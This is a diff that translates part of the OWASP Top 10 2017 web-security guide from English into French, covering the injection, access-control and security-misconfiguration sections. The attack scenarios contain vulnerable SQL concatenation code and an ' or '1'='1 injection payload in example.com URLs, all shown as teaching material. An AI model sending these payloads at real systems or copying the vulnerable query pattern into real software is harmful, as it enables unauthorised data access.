@@ -18,8 +18,8 @@
 <body>
 <p><img src="images/OWASP_logo.png" alt="OWASP LOGO" /></p>
 <h2>OWASP Top 10 2017</h2>
-<p>The Ten Most Critical Web Application Security Risks</p>
-<p>November 20, 2017</p>
+<p>Les Dix Risques de Sécurité Applicatifs Web les Plus Critiques</p>
+<p>20 Novembre 2017</p>
 <h3>Release</h3>
 <p>Comments requested per instructions within</p>
 <p><img src="images/front-wasp.png" alt="WASP Logo URL TBA" /></p>
@@ -62,8 +62,8 @@
 <h1>TOC</h1></li>
 </ul>
 <p>&lt; replace me with a toc &gt;</p>
-<h1>O About OWASP</h1>
-<h2>About OWASP</h2>
+<h1>O A propos de l'OWASP</h1>
+<h2>A propos de l'OWASP</h2>
 <p>The Open Web Application Security Project (OWASP) is an open community dedicated to enabling organizations to develop, purchase, and maintain applications and APIs that can be trusted.</p>
 <p>At OWASP, you'll find free and open:</p>
 <ul>
@@ -83,11 +83,11 @@
 <p>OWASP is a new kind of organization. Our freedom from commercial pressures allows us to provide unbiased, practical, and cost-effective information about application security.</p>
 <p>OWASP is not affiliated with any technology company, although we support the informed use of commercial security technology. OWASP produces many types of materials in a collaborative, transparent, and open way.</p>
 <p>The OWASP Foundation is the non-profit entity that ensures the project's long-term success. Almost everyone associated with OWASP is a volunteer, including the OWASP board, chapter leaders, project leaders, and project members. We support innovative security research with grants and infrastructure.</p>
-<p>Come join us!</p>
+<p>Rejoignez nous !</p>
 <h2>Copyright and License</h2>
 <p><img src="images/license.png" alt="license" /></p>
-<p>Copyright © 2003-2017 The OWASP Foundation. This document is released under the Creative Commons Attribution Share-Alike 4.0 license. For any reuse or distribution, you must make it clear to others the license terms of this work.</p>
-<h2>Foreword</h2>
+<p>Copyright © 2003 – 2017 The OWASP Foundation Ce document est publié sous licence Creative Commons Attribution ShareAlike 4.0. A chaque réutilisation ou distribution, vous devez en faire clairement apparaître les conditions contractuelles</p>
+<h2>Avant Propos</h2>
 <p>Insecure software is undermining our financial, healthcare, defense, energy, and other critical infrastructure. As our software becomes increasingly complex, and connected, the difficulty of achieving application security increases exponentially. The rapid pace of modern software development processes makes the most common risks essential to discover and resolve quickly and accurately. We can no longer afford to tolerate relatively simple security problems like those presented in this OWASP Top 10.</p>
 <p>A great deal of feedback was received during the creation of the OWASP Top 10 - 2017, more than for any other equivalent OWASP effort. This shows how much passion the community has for the OWASP Top 10, and thus how critical it is for OWASP to get the Top 10 right for the majority of use cases.</p>
 <p>Although the original goal of the OWASP Top 10 project was simply to raise awareness amongst developers and managers, it has become the de facto application security standard. </p>
@@ -129,32 +129,32 @@
 <p>A big thank you to the more than 500 individuals who took the time to complete the industry ranked survey. Your voice helped determine two new additions to the Top 10. The additional comments, notes of encouragement, and criticisms were all appreciated. We know your time is valuable and we wanted to say thanks.</p>
 <p>We would like to thank those individuals who contributed significant constructive comments and time reviewing this update to the Top 10. As much as possible, we have listed them on the &quot;Acknowledgements&quot; page.</p>
 <p>And finally, we'd like to thank in advance all the translators out there who will translate this release of the Top 10 into numerous different languages, helping to make the OWASP Top 10 more accessible to the entire planet.</p>
-<h1>RN Release Notes</h1>
-<h2>What changed from 2013 to 2017?</h2>
-<p>Change has accelerated over the last four years, and the OWASP Top 10 needed to change. We've completely refactored the OWASP Top 10, revamped the methodology, utilized a new data call process, worked with the community, re-ordered our risks, re-written each risk from the ground up, and added references to frameworks and languages that are now commonly used.</p>
-<p>Over the last few years, the fundamental technology and architecture of applications has changed significantly:</p>
+<h1>RN Notes de version</h1>
+<h2>Ce qui a changé entre 2013 et 2017</h2>
+<p>Depuis les quatre dernières années, les changements se sont accélérés, et le Top 10 de l'OWASP devait en tenir compte. Nous avons complètement restructuré le Top 10 de l'OWASP, renouvelé la démarche, utilisé de nouvelles sources de données, travaillé avec la communauté, réorganisé les risques, réécrit chaque risque à partir de zéro, et ajouté des références aux environnements et aux langages communément utilisés.</p>
+<p>Au cours des dernières années, les technologies de base et les architectures des applications ont évolué de façon significative:</p>
 <ul>
-<li>Microservices written in node.js and Spring Boot are replacing traditional monolithic applications. Microservices come with their own security challenges including establishing trust between microservices, containers, secret management, etc. Old code never expected to be accessible from the Internet is now sitting behind an API or RESTful web service to be consumed by Single Page Applications (SPAs) and mobile applications. Architectural assumptions by the code, such as trusted callers, are no longer valid.</li>
-<li>Single page applications, written in JavaScript frameworks such as Angular and React, allow the creation of highly modular feature-rich front ends. Client-side functionality that has traditionally been delivered server-side brings its own security challenges.</li>
-<li>JavaScript is now the primary language of the web with node.js running server side and modern web frameworks such as Bootstrap, Electron, Angular, and React running on the client.</li>
+<li>Des microservices écrits en node.js et Spring Boot ont remplacé les traditionnelles applications monolithiques. Les microservices ont leurs propres enjeux de sécurité comme d'établir la confiance entre microservices, conteneurs, de gérer les secrets, etc. Du vieux code qui ne devait jamais être accessible depuis Internet se retrouve aujourd'hui derrière des API ou des web services RESTful appelés par des Applications Web Monopage (&quot;Single-Page Application ou SPA&quot;) et des applications mobiles. Les hypothèses d'architecture du code, tels que des appelants de confiance, ne sont plus valables.</li>
+<li>Les Applications Web Monopage, écrites dans des environnements JavaScript comme Angular et React, permettent de créer des interfaces web utilisateur très modulaires et riches en fonctionnalités. Les fonctionnalités côté Client, traditionnellement délivrées par le serveur, apportent leurs propres enjeux de sécurité.</li>
+<li>JavaScript est aujourd'hui le premier langage web avec node.js côté Serveur et, de nouveaux environnements logiciels web tels que Bootstrap, Electron, Angular, et React, côté Client.</li>
 </ul>
-<h2>New issues, supported by data</h2>
+<h2>Nouveaux enjeux, concernant les données</h2>
 <ul>
-<li><strong>A4:2017-XML External Entities (XXE)</strong> is a new category primarily supported by source code analysis security testing tools (<a href="https://www.owasp.org/index.php/Source_Code_Analysis_Tools">SAST</a>) data sets.</li>
+<li><strong>A4:2017-Entités Externes XML (XXE)</strong> est une nouvelle catégorie soutenue essentiellement par des outils d'analyse sécurité de code source tels que ceux référencés dans (<a href="https://www.owasp.org/index.php/Source_Code_Analysis_Tools">SAST</a>).</li>
 </ul>
-<h2>New issues, supported by the community</h2>
-<p>We asked the community to provide insight into two forward looking weakness categories. After over 500 peer submissions, and removing issues that were already supported by data (such as Sensitive Data Exposure and XXE), the two new issues are: </p>
+<h2>Nouveaux enjeux, relevés par la communauté</h2>
+<p>Nous avons interrogé la communauté pour avoir leur retour prospectif sur deux catégories de vulnérabilités. Après plus de 500 propositions de nos pairs, et la suppression des enjeux déjà pris en compte dans le cadre des données (tels que ceux de &quot;Exposition de Données Sensibles&quot; et &quot;XXE&quot;), nous avons retenu deux nouveaux enjeux: </p>
 <ul>
-<li><strong>A8:2017-Insecure Deserialization</strong>, which permits remote code execution or sensitive object manipulation on affected platforms.</li>
-<li><strong>A10:2017-Insufficient Logging and Monitoring</strong>, the lack of which can prevent or significantly delay malicious activity and breach detection, incident response, and digital forensics.</li>
+<li><strong>A8:2017-Désérialisation non Sécurisée</strong>, qui permet l'exécution de code à distance ou la manipulation d'objects sensibles sur les plateformes concernées.</li>
+<li><strong>A10:2017-Supervision et Journalisation Insuffisantes</strong>, l'insuffisance de prévention et de limitation des activités malveillantes et de détection des attaques, de réponse aux incidents, et d'analyses légales post-incident.</li>
 </ul>
-<h2>Merged or retired, but not forgotten</h2>
+<h2>Enjeux fusionnés ou supprimés, mais non oubliés</h2>
 <ul>
-<li><strong>A4-Insecure Direct Object References</strong> and <strong>A7-Missing Function Level Access Control</strong> merged into <strong>A5:2017-Broken Access Control</strong>.</li>
-<li><strong>A8-Cross-Site Request Forgery (CSRF)</strong>, as many frameworks include <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)">CSRF defenses</a>, it was found in only 5% of applications.</li>
-<li><strong>A10-Unvalidated Redirects and Forwards</strong>, while found in approximately in 8% of applications, it was edged out overall by XXE.</li>
+<li><strong>A4–Références directes non sécurisées à un objet</strong> et <strong>A7–Manque de contrôle d’accès au niveau fonctionnel</strong> ont été fusionnés dans <strong>A5:2017-Ruptures de Contrôles d'Accès</strong>.</li>
+<li><strong>A8–Falsification de requête intersites (CSRF)</strong>, a été supprimé car beaucoup d'environnements logiciel intègrent des <a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)">défenses CSRF</a>, et que cela n'a été retrouvé que dans 5% des applications.</li>
+<li><strong>A10–Redirection et Renvois non validés</strong>, a été supprimé, bien que cela ait été retrouvé dans 8% des applications, car cela est globalement détrôné par XXE.</li>
 </ul>
-<p><img src="images/0x06-release-notes-1.png" alt="0x06-release-notes-1" /></p>
+<p><img src="images/0x06-release-notes-1-fr.png" alt="0x06-release-notes-1" /></p>
 <h1>Risk - Application Security Risks</h1>
 <h2>What Are Application Security Risks?</h2>
 <p>Attackers can potentially use many different paths through your application to do harm to your business or organization. Each of these paths represents a risk that may, or may not, be serious enough to warrant attention.</p>
@@ -282,59 +282,33 @@
 </tbody>
 </table>
 <h1>A1:2017 Injection</h1>
-<table>
-<colgroup>
-<col style="width: 33%" />
-<col style="width: 33%" />
-<col style="width: 33%" />
-</colgroup>
-<thead>
-<tr class="header">
-<th>Threat agents/Attack vectors</th>
-<th>Security Weakness</th>
-<th>Impacts</th>
-</tr>
-</thead>
-<tbody>
-<tr class="odd">
-<td>Access Lvl : Exploitability 3</td>
-<td>Prevalence 2 : Detectability 3</td>
-<td>Technical 3 : Business</td>
-</tr>
-<tr class="even">
-<td>Almost any source of data can be an injection vector, environment variables, parameters, external and internal web services, and all types of users. <a href="https://www.owasp.org/index.php/Injection_Flaws">Injection flaws</a> occur when an attacker can send hostile data to an interpreter.</td>
-<td>Injection flaws are very prevalent, particularly in legacy code. Injection vulnerabilities are often found in SQL, LDAP, XPath, or NoSQL queries, OS commands, XML parsers, SMTP headers, expression languages, and ORM queries. Injection flaws are easy to discover when examining code. Scanners and fuzzers can help attackers find injection flaws.</td>
-<td>Injection can result in data loss, corruption, or disclosure to unauthorized parties, loss of accountability, or denial of access. Injection can sometimes lead to complete host takeover. The business impact depends on the needs of the application and data.</td>
-</tr>
-</tbody>
-</table>
-<h2>Is the Application Vulnerable?</h2>
-<p>An application is vulnerable to attack when:</p>
+<p>| Facteurs de Menace/Vecteurs d'Attaque | Vulnérabilité | Impacts Techniques | | Impacts Métiers | -- | -- | | Accès Lvl : Exploitation 3 | Fréquence 2 : Détection 3 | Impact 3 : Business | | Considérez que n’importe qui peut envoyer des données non fiables au système, y compris les utilisateurs externes, internes, et administrateurs. Presque toute source de données peut être un vecteur d’injection, y compris les variables d'environnement, les paramètres et les web services internes et externes. <a href="https://www.owasp.org/index.php/Injection_Flaws">Les failles d'injection</a> surviennent lorsqu’une application envoie des données non fiable à un interpréteur. | Les failles d’injection sont très fréquentes, surtout dans le code ancien. On les retrouve souvent dans les requêtes SQL, LDAP, XPath, noSQL, commandes OS, parseurs XML, arguments de programme, etc. Les failles d’Injection sont faciles à découvrir lors d’un audit de code, mais plus difficilement via test. Scanners et Fuzzers aident les attaquants à les trouver. | L’Injection peut résulter en une perte ou une corruption de données, une divulgation à des tiers non autorisés, une perte de droits, ou un refus d’accès. L’Injection peut parfois mener à une prise de contrôle totale du serveur. Considérez la valeur métier de la donnée impactée et la plateforme exécutant l’interpréteur. Toute donnée pourrait être volée, modifiée ou supprimée. Votre réputation pourrait-elle en pâtir?|</p>
+<h2>Suis-je vulnérable à l’Injection?</h2>
+<p>Une application est vulnérable quand :</p>
 <ul>
-<li>User-supplied data is not validated, filtered, or sanitized by the application.</li>
-<li>Dynamic queries or non-parameterized calls without context-aware escaping are used directly in the interpreter.<br />
-</li>
-<li>Hostile data is used within object-relational mapping (ORM) search parameters to extract additional, sensitive records.</li>
-<li>Hostile data is directly used or concatenated, such that the SQL or command contains both structure and hostile data in dynamic queries, commands, or stored procedures.</li>
-<li>Some of the more common injections are SQL, NoSQL, OS command, Object Relational Mapping (ORM), LDAP, and Expression Language (EL) or Object Graph Navigation Library (OGNL) injection. The concept is identical among all interpreters. Source code review is the best method of detecting if applications are vulnerable to injections, closely followed by thorough automated testing of all parameters, headers, URL, cookies, JSON, SOAP, and XML data inputs. Organizations can include static source (<a href="https://www.owasp.org/index.php/Source_Code_Analysis_Tools">SAST</a>) and dynamic application test (<a href="https://www.owasp.org/index.php/Category:Vulnerability_Scanning_Tools">DAST</a>) tools into the CI/CD pipeline to identify newly introduced injection flaws prior to production deployment.</li>
+<li>les données venant de l'utilisateur ne sont pas validées, filtrées ou nettoyées par l'application ;</li>
+<li>des requêtes dynamiques ou des appels non paramétrés sans échappage par rappport au contexte sont envoyés à l'interpréteur ;</li>
+<li>des données hostiles sont utilisées au sein de paramètres de recherche de mapping objet - relationnel (ORM) pour extraire des données supplémentaires sensibles ;</li>
+<li>des données hostiles sont utilisées directement ou concaténées, par exemple lors de la construction de requête dynamiques, de commandes ou de procédures stockées pour des requêtes SQL ou des commandes OS ;</li>
+<li>les injections les plus courantes se font dans le SQL, le NoSQL, les commandes OS, le mapping objet - relationnel, le LDAP, l'Expression Language et le Object Graph Navigation Library (OGNL). La façon de faire est la même pour tous les interpréteurs. La revue de code source est la meilleure manière de détecter si une application est vulnérable à l'Injection, suivie de près par le test automatique de toutes les données d'entrée via les paramètres, en-têtes, URL, cookies, JSON, SOAP et XML. Les organisations peuvent tirer profit de la puissance des outils d'analyse statique de code (SAST) ou d'analyse dynamique de l'application (DAST) en les intégrant dans leur chaine d'intégration continue (CI / CD) pour identifier avant déploiement en production les vulnérabilités liées aux injections.</li>
 </ul>
-<h2>How To Prevent</h2>
-<p>Preventing injection requires keeping data separate from commands and queries.</p>
+<h2>Comment empêcher l'injection?</h2>
+<p>Prévenir l’Injection exige de séparer les données non fiables des commandes et requêtes.</p>
 <ul>
-<li>The preferred option is to use a safe API, which avoids the use of the interpreter entirely or provides a parameterized interface, or migrate to use Object Relational Mapping Tools (ORMs). <strong>Note</strong>: Even when parameterized, stored procedures can still introduce SQL injection if PL/SQL or T-SQL concatenates queries and data, or executes hostile data with EXECUTE IMMEDIATE or exec().</li>
-<li>Use positive or &quot;whitelist&quot; server-side input validation. This is not a complete defense as many applications require special characters, such as text areas or APIs for mobile applications.</li>
-<li>For any residual dynamic queries, escape special characters using the specific escape syntax for that interpreter. <strong>Note</strong>: SQL structure such as table names, column names, and so on cannot be escaped, and thus user-supplied structure names are dangerous. This is a common issue in report-writing software.</li>
-<li>Use LIMIT and other SQL controls within queries to prevent mass disclosure of records in case of SQL injection.</li>
+<li>La meilleure option est d’utiliser une API saine qui évite complètement l’utilisation de l’interpréteur ou fournit une interface paramétrable, ou bien de migrer pour utiliser les outils d'Object Relational Mapping Tools (ORMs). <strong>Note</strong>: Attention aux APIs, telles les procédures stockées, qui sont paramétrables, mais qui pourraient introduire une Injection SQL si PL/SQL ou T-SQL concatène requêtes et données ou exécute des données non saines avec EXECUTE IMMEDIATE ou exec().</li>
+<li>Pour les données en entrée, la « whitelist » avec normalisation est recommandée, mais n’est pas une défense complète dans la mesure où de nombreuses applications requièrent des caractères spéciaux, par exemple les zones de texte ou les APIs pour les applications mobiles.</li>
+<li>Pour les requêtes dynamiques restantes, vous devriez soigneusement échapper les caractères spéciaux en utilisant la syntaxe d’échappement spécifique à l’interpréteur. <strong>Note</strong>: Les structures SQL telles que les noms de table, les noms de colonne, et d'autres ne peuvent pas être échappées et les noms de structures venant de l'utilisateur doivent donc être considérés comme dangereux. Ceci est un problème courant dans les logiciels d'aide à l'écriture de rapports.</li>
+<li>Il est conseillé d'utiliser LIMIT et autres contrôles SQL à l'intérieur des requêtes pour empêcher les divulgations massives de données dans le cas d'injection SQL.</li>
 </ul>
-<h2>Example Attack Scenarios</h2>
-<p><strong>Scenario #1</strong>: An application uses untrusted data in the construction of the following vulnerable SQL call:</p>
+<h2>Exemples de scénarios d'attaque</h2>
+<p><strong>Scenario #1</strong>: L’application utilise des données non fiables dans la construction de l’appel SQL vulnérable suivant:</p>
 <p><code>String query = &quot;SELECT * FROM accounts WHERE custID='&quot; + request.getParameter(&quot;id&quot;) + &quot;'&quot;;</code></p>
-<p><strong>Scenario #2</strong>: Similarly, an application’s blind trust in frameworks may result in queries that are still vulnerable, (e.g. Hibernate Query Language (HQL)):</p>
+<p><strong>Scenario #2</strong>: De même, la confiance aveugle d'une application dans les frameworks qu'elle utilise peut faire que ses requêts sont toujours vulnérables (par exemple Hibernate Query Language (HQL)):</p>
 <p><code>Query HQLQuery = session.createQuery(&quot;FROM accounts WHERE custID='&quot; + request.getParameter(&quot;id&quot;) + &quot;'&quot;);</code></p>
-<p>In both cases, the attacker modifies the ‘id’ parameter value in their browser to send: ' or '1'='1. For example:</p>
+<p>Dans les deux cas, l'attaquant modifie le paramètre ‘id’ dans son navigateur en : ' or '1'='1. Par exemple :</p>
 <p><code>http://example.com/app/accountView?id=' or '1'='1</code></p>
-<p>This changes the meaning of both queries to return all the records from the accounts table. More dangerous attacks could modify or delete data, or even invoke stored procedures.</p>
-<h2>References</h2>
+<p>Ceci change le sens de chacune des requêtes pour récupérer tous les enregistrements de la table des comptes. Dans le pire des cas, l’attaquant exploite cette faiblesse pour modifier ou détruire des données, ou appeler des procédures stockées de la base de données.</p>
+<h2>Références</h2>
 <h3>OWASP</h3>
 <ul>
 <li><a href="https://www.owasp.org/index.php/OWASP_Proactive_Controls#2:_Parameterize_Queries">OWASP Proactive Controls: Parameterize Queries</a></li>
@@ -346,7 +320,7 @@
 <li><a href="https://www.owasp.org/index.php/Query_Parameterization_Cheat_Sheet">OWASP Cheat Sheet: Query Parameterization</a></li>
 <li><a href="https://www.owasp.org/index.php/OWASP_Automated_Threats_to_Web_Applications">OWASP Automated Threats to Web Applications – OAT-014</a></li>
 </ul>
-<h3>External</h3>
+<h3>Externe</h3>
 <ul>
 <li><a href="https://cwe.mitre.org/data/definitions/77.html">CWE-77: Command Injection</a></li>
 <li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: SQL Injection</a></li>
@@ -585,58 +559,58 @@
 </colgroup>
 <thead>
 <tr class="header">
-<th>Threat agents/Attack vectors</th>
-<th>Security Weakness</th>
+<th>Facteurs de menace/Vecteurs d'attaque</th>
+<th>Vulnérabilité</th>
 <th>Impacts</th>
 </tr>
 </thead>
 <tbody>
 <tr class="odd">
-<td>Access Lvl : Exploitability 2</td>
-<td>Prevalence 2 : Detectability 2</td>
-<td>Technical 3 : Business</td>
+<td>Niveau d'accès : Exploitation 2</td>
+<td>Fréquence 2 : Détection 2</td>
+<td>Impact 3 : Métier</td>
 </tr>
 <tr class="even">
-<td>Exploitation of access control is a core skill of attackers. <a href="https://www.owasp.org/index.php/Source_Code_Analysis_Tools">SAST</a> and <a href="https://www.owasp.org/index.php/Category:Vulnerability_Scanning_Tools">DAST</a> tools can detect the absence of access control but cannot verify if it is functional when it is present. Access control is detectable using manual means, or possibly through automation for the absence of access controls in certain frameworks.</td>
-<td>Access control weaknesses are common due to the lack of automated detection, and lack of effective functional testing by application developers. Access control detection is not typically amenable to automated static or dynamic testing. Manual testing is the best way to detect missing or ineffective access control, including HTTP method (GET vs PUT, etc), controller, direct object references, etc.</td>
-<td>The technical impact is attackers acting as users or administrators, or users using privileged functions, or creating, accessing, updating or deleting every record. The business impact depends on the protection needs of the application and data.</td>
+<td>L'exploitation des contrôles d'accès est une des principales compétences des attaquants. Les outils <a href="https://www.owasp.org/index.php/Source_Code_Analysis_Tools">SAST</a> and <a href="https://www.owasp.org/index.php/Category:Vulnerability_Scanning_Tools">DAST</a> peuvent détecter l'absence de contrôles d'accès mais ne peuvent vérifier s'ils sont efficaces quand ils existent. Les contrôles d'accès peuvent être détectés par des tests manuels, leur absence peut être détectée par des contrôles automatiques dans certains frameworks.</td>
+<td>Les vulnérabilités de contrôles d'accès surviennent souvent par le manque de détection automatique, et le manque de tests fonctionnels effectifs par les développeurs d'applications. La detection des contrôles d'accès ne se prête pas bien aux tests statiques ou dynamiques. Les tests manuels sont la meilleure méthode de détecter des contrôles d'accès manquant ou défectueux, Ceci inclut mes méthodes HTTP (GET vs PUT, etc), les contrôleurs, les références directes d'objets, etc.</td>
+<td>Techniquement parlant, l'impact est qu'un attaquant peut obtenir les droits d'un utilisateur ou d'un administrateur, ou qu'un utilisateur obtienne des droits privilégiés ou qu'il puisse créer, lire ou supprimer tout enregistrement de son choix. L'impact métier est dépendant du niveau de protection nécessité par l'application et ses données.</td>
 </tr>
 </tbody>
 </table>
-<h2>Is the Application Vulnerable?</h2>
-<p>Access control enforces policy such that users cannot act outside of their intended permissions. Failures typically lead to unauthorized information disclosure, modification or destruction of all data, or performing a business function outside of the limits of the user. Common access control vulnerabilities include:</p>
+<h2>Suis-je vulnérable ?</h2>
+<p>Les contrôles d'accès appliquent une politique assurant que les utilisateurs respectent leurs permissions. Une faille entraînera généralement des fuites d'informations, des corruptions ou destructions de données, ou permettra des actions en dehors des autorisations de l'utilisateur. Les vulnérabilités de contrôle d'accès consistent généralement :</p>
 <ul>
-<li>Bypassing access control checks by modifying the URL, internal application state, or the HTML page, or simply using a custom API attack tool.</li>
-<li>Allowing the primary key to be changed to another's users record, permitting viewing or editing someone else's account.</li>
-<li>Elevation of privilege. Acting as a user without being logged in, or acting as an admin when logged in as a user.</li>
-<li>Metadata manipulation, such as replaying or tampering with a JSON Web Token (JWT) access control token or a cookie or hidden field manipulated to elevate privileges, or abusing JWT invalidation</li>
-<li>CORS misconfiguration allows unauthorized API access.</li>
-<li>Force browsing to authenticated pages as an unauthenticated user or to privileged pages as a standard user. Accessing API with missing access controls for POST, PUT and DELETE.</li>
+<li>A contourner les contrôles d'accès en modifiant l'URL, l'état interne de l'application, ou la page HTML ; ou simplement en utilisant un outil dédié d'attaque d'API.</li>
+<li>A permettre la modification de la clef primaire pour pointer sur l'enregistrement d'un autre utilisateur, donnant ainsi la possibilité de voir ou modifier le compte de quelqu'un d'autre.</li>
+<li>A permettre une élévation de privilège, c'est à dire permettre d'agir comme un utilisateur connecté, ou comme administrateur alors que l'on est connecté comme utilisateur.</li>
+<li>A permettre les manipulations de meta-données, comme le rejeu ou la modification de JSON Web Token (JWT), de cookies ou de champs cachés, afin d'élever les privilèges, ou d'abuser les invalidation JWT.</li>
+<li>A permettre l'accès non-autorisé à des API, par mauvaise configuration CORS.</li>
+<li>A permettre la navigation forcée vers des pages soumises à authentification sans être authentifié, ou à des pages soumise à accès privilégié en étant connecté comme simple utilisateurs. A permettre l'accès à des API sans contrôle pour POST, PUT et DELETE.</li>
 </ul>
-<h2>How To Prevent</h2>
-<p>Access control is only effective if enforced in trusted server-side code or server-less API, where the attacker cannot modify the access control check or metadata.</p>
+<h2>Comment s'en prémunir ?</h2>
+<p>Les contrôles d'accès ne sont efficaces que s'ils sont appliqués dans du code de confiance côté serveur ou dans des API server-less, là ou un attaquant ne peut pas modifier les vérifications des contrôles ni les meta-données.</p>
 <ul>
-<li>With the exception of public resources, deny by default.</li>
-<li>Implement access control mechanisms once and re-use them throughout the application, including minimizing CORS usage.</li>
-<li>Model access controls should enforce record ownership, rather than accepting that the user can create, read, update, or delete any record.</li>
-<li>Unique application business limit requirements should be enforced by domain models.</li>
-<li>Disable web server directory listing and ensure file metadata (e.g. .git) and backup files are not present within web roots.</li>
-<li>Log access control failures, alert admins when appropriate (e.g. repeated failures).</li>
-<li>Rate limit API and controller access to minimize the harm from automated attack tooling.</li>
-<li>JWT tokens should be invalidated on the server after logout.</li>
-<li>Developers and QA staff should include functional access control unit and integration tests.</li>
+<li>A l'exception des ressources publiques, tout doit être bloqué par défaut.</li>
+<li>Centraliser l'implémentation des mécanismes de contrôle d'accès et les réutiliser dans l'ensemble de l'application. Cela comprend de minimiser l'utilisation de CORS.</li>
+<li>Le modèle de contrôle d'accès doit vérifier l'appartenance des enregistrements, plutôt que de permettre à l'utilisateur de créer, lire, modifier ou supprimer n'importe quel enregistrement.</li>
+<li>Les exigences spécifiques métier de l'application doivent être appliquées par domaines.</li>
+<li>Désactiver le listing de dossier sur le serveur web, et vérifier que les fichier de meta-données (ex: .git) et de sauvegardes ne se trouvent pas dans l'arborescence web.</li>
+<li>Tracer les échecs de contrôles d'accès, les alertes administrateur quand c'est approprié (ex: échecs répétés).</li>
+<li>Limiter la fréquence d'accès aux API et aux contrôleurs d'accès, afin de minimiser les dégats que causeraient des outils d'attaques automatisés.</li>
+<li>Les jetons JWT doivent être invalidés côté serveur après une déconnexion.</li>
+<li>Les développeurs et les testeurs qualité doivent procéder à des tests unitaires et d'intégration sur les fonctionnalités de contrôle d'accès.</li>
 </ul>
-<h2>Example Attack Scenarios</h2>
-<p><strong>Scenario #1</strong>: The application uses unverified data in a SQL call that is accessing account information:</p>
+<h2>Exemple de scénarii d'attaque</h2>
+<p><strong>Scénario #1</strong>: L'application utilise des données non vérifiées dans un appel SQL qui accède aux informations d'un compte :</p>
 <pre><code>  pstmt.setString(1, request.getParameter(&quot;acct&quot;));
   ResultSet results = pstmt.executeQuery();</code></pre>
-<p>An attacker simply modifies the 'acct' parameter in the browser to send whatever account number they want. If not properly verified, the attacker can access any user's account.</p>
+<p>En modifiant simplement le paramètre 'acct' dans le navigateur, un attaquant peut envoyer le numéro de compte qu'il veut. Si ce numéro n'est pas vérifié, l'attaquant peut accéder à n'importe quel compte utilisateur.</p>
 <p><code>http://example.com/app/accountInfo?acct=notmyacct</code></p>
-<p><strong>Scenario #2</strong>: An attacker simply force browses to target URLs. Admin rights are required for access to the admin page.</p>
+<p><strong>Scénario #2</strong>: Un attaquant force le navigateur à visiter des URLs arbitraires. Il faut imposer des droits pour accéder à une page d'administration.</p>
 <pre><code>  http://example.com/app/getappInfo
   http://example.com/app/admin_getappInfo</code></pre>
-<p>If an unauthenticated user can access either page, it’s a flaw. If a non-admin can access the admin page, this is a flaw.</p>
-<h2>References</h2>
+<p>Si un utilisateur non-authentifié peut accéder à l'une des pages, c'est une faille. Si un non-administrateur peut accéder à une page d'administration, c'est une faille.</p>
+<h2>Références</h2>
 <h3>OWASP</h3>
 <ul>
 <li><a href="https://www.owasp.org/index.php/OWASP_Proactive_Controls#6:_Implement_Access_Controls">OWASP Proactive Controls: Access Controls</a></li>
@@ -644,7 +618,7 @@
 <li><a href="https://www.owasp.org/index.php/Testing_for_Authorization">OWASP Testing Guide: Authorization Testing</a></li>
 <li><a href="https://www.owasp.org/index.php/Access_Control_Cheat_Sheet">OWASP Cheat Sheet: Access Control</a></li>
 </ul>
-<h3>External</h3>
+<h3>Externes</h3>
 <ul>
 <li><a href="https://cwe.mitre.org/data/definitions/22.html">CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</a></li>
 <li><a href="https://cwe.mitre.org/data/definitions/284.html">CWE-284: Improper Access Control (Authorization)</a></li>
@@ -652,7 +626,7 @@
 <li><a href="https://cwe.mitre.org/data/definitions/639.html">CWE-639: Authorization Bypass Through User-Controlled Key</a></li>
 <li><a href="https://portswigger.net/blog/exploiting-cors-misconfigurations-for-bitcoins-and-bounties">PortSwigger: Exploiting CORS misconfiguration</a></li>
 </ul>
-<h1>A6:2017 Security Misconfiguration</h1>
+<h1>A6:2017 Mauvaise configuration de Sécurité</h1>
 <table>
 <colgroup>
 <col style="width: 33%" />
@@ -661,61 +635,61 @@
 </colgroup>
 <thead>
 <tr class="header">
-<th>Threat agents/Attack vectors</th>
-<th>Security Weakness</th>
+<th>Agents de menace/Vecteurs d'attaque</th>
+<th>Vulnérabilité de Sécuité</th>
 <th>Impacts</th>
 </tr>
 </thead>
 <tbody>
 <tr class="odd">
-<td>Access Lvl : Exploitability 3</td>
-<td>Prevalence 3 : Detectability 3</td>
-<td>Technical 2 : Business</td>
+<td>Niveau d'accès : Exploitation 3</td>
+<td>Fréquence 3 : Détection 3</td>
+<td>Technique 2 : Métier</td>
 </tr>
 <tr class="even">
-<td>Attackers will often attempt to exploit unpatched flaws or access default accounts, unused pages, unprotected files and directories, etc to gain unauthorized access or knowledge of the system.</td>
-<td>Security misconfiguration can happen at any level of an application stack, including the network services, platform, web server, application server, database, frameworks, custom code, and pre-installed virtual machines, containers, or storage. Automated scanners are useful for detecting misconfigurations, use of default accounts or configurations, unnecessary services, legacy options, etc.</td>
-<td>Such flaws frequently give attackers unauthorized access to some system data or functionality. Occasionally, such flaws result in a complete system compromise. The business impact depends on the protection needs of the application and data.</td>
+<td>Les attaquants tentent fréquemment d'exploiter des vulnérabilités non corrigées ou d'accéder aux comptes par défaut, aux pages inutilisées, aux fichiers et répertoires non protégés, etc... afin d'obtenir des accès non autorisés et une meilleure connaissance du système visé.</td>
+<td>Une mauvaise de configuration de sécurité peut survenir sur l'ensemble des couches protocolaires, dont les services de réseau, la plateforme, le serveur Web, le serveur d'application, la base de données, les frameworks, les codes spécifiques, et les machines virtuelles pré-installées, les conteneurs, et le stockage. Les scanners automatisés sont utiles pour détecter les erreurs de configurations, l'utilisation de comptes ou de configurations par défaut, les services inutiles, les options héritées de configurations précédentes, etc.</td>
+<td>De tels défauts ou vulnérabilités fournissent souvent aux attaquants un accès non autorisés à certains données du système, ou à des fonctionnalités. Il arrive parfois que de tels vulnérabilités ou défauts entraînent une compromission complète du système. L'impact métier dépend des exigences de protection sécurité portées par l'application et les données.</td>
 </tr>
 </tbody>
 </table>
-<h2>Is the Application Vulnerable?</h2>
-<p>The application might be vulnerable if the application is:</p>
+<h2>Suis-je Vulnérable ?</h2>
+<p>L'application peut être vulnérable si :</p>
 <ul>
-<li>Missing appropriate security hardening across any part of the application stack, or improperly configured permissions on cloud services.</li>
-<li>Unnecessary features are enabled or installed (e.g. unnecessary ports, services, pages, accounts, or privileges).</li>
-<li>Default accounts and their passwords still enabled and unchanged.</li>
-<li>Error handling reveals stack traces or other overly informative error messages to users.</li>
-<li>For upgraded systems, latest security features are disabled or not configured securely.</li>
